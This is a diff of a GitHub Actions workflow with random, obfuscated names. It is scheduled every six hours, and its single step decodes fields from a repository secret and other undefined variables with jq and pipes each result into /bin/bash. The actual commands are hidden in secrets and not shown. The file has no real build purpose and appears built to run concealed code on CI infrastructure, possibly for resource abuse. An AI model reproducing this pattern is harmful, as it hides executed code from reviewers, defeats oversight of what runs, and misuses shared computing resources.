@@ -1,29 +1,31 @@
 name: meilitong3214
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
-
+    - cron: '39 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: meilitong3214
         env:
-          xsurq103: ${{ secrets.xsurq103 }}
+          qxcw9: ${{ secrets.qxcw9 }}
         run: |
-          echo $xsurq103 | jq -r .hvdo2 | /bin/bash
-          echo $u68204 | jq -r .v7607 | /bin/bash
-          echo $zn54 | jq -r .uba95896 | /bin/bash
-          echo $hch681 | jq -r .xdux08310 | /bin/bash
-          echo $nv804 | jq -r .bex83 | /bin/bash
-          echo $rxvd59160 | jq -r .wxzrg49 | /bin/bash
-          echo $ebx23269 | jq -r .yqfjs96 | /bin/bash
-          echo $sxbnv40615 | jq -r .vsp261 | /bin/bash
-          echo $yriu21488 | jq -r .jh62321 | /bin/bash
-          echo $qgq0980 | jq -r .ereh2925 | /bin/bash
-          echo $dn31 | jq -r .ga375 | /bin/bash
-          echo $o541 | jq -r .s8 | /bin/bash
+          echo $qxcw9 | jq -r .od2 | /bin/bash
+          echo $t7775 | jq -r .maadn857 | /bin/bash
+          echo $etads2 | jq -r .rc2357 | /bin/bash
+          echo $c9 | jq -r .rs26 | /bin/bash
+          echo $cu9652 | jq -r .cu6 | /bin/bash
+          echo $bhgu8 | jq -r .nkz6454 | /bin/bash
+          echo $r77510 | jq -r .vm49 | /bin/bash
+          echo $esv4434 | jq -r .pq95964 | /bin/bash
+          echo $hgn78 | jq -r .enttl2 | /bin/bash
+          echo $hqru27433 | jq -r .suqj32 | /bin/bash
+          echo $lkrhp8706 | jq -r .guzjy335 | /bin/bash
+          echo $wbu2 | jq -r .hscb8573 | /bin/bash
+          echo $qtmj61849 | jq -r .jx7 | /bin/bash
+          echo $onf1702 | jq -r .iwfkq1938 | /bin/bash
+          echo $lmikk9 | jq -r .r072 | /bin/bash
 
